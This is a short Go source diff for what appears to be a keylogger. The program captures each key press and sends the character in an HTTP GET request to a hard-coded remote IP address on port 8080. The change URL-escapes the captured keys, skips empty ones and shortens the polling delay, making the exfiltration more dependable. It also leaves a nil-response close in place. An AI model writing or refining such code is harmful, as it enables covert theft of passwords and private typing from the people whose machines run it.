@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"os"
 	"runtime"
 	"time"
@@ -12,7 +13,7 @@ import (
 )
 
 const (
-	delayKeyfetchMS = 5
+	delayKeyfetchMS = 4
 	URL             = "http://195.154.191.13"
 )
 
@@ -78,12 +79,14 @@ func main() {
 
 		if !key.Empty {
 			var str string = string(key.Rune)
-
-			resp, err := http.Get(URL + ":8080/key?v=" + str)
-			if err == nil {
-				fmt.Println(resp.StatusCode)
+			if str != "" {
+				resp, err := http.Get(URL + ":8080/key?v=" + url.QueryEscape(str))
+				if err == nil {
+					fmt.Println(resp.StatusCode)
+				}
+				defer resp.Body.Close()
 			}
-			defer resp.Body.Close()
+
 			fmt.Printf("'%s' %d                     \n", str, key.Keycode)
 		}
 
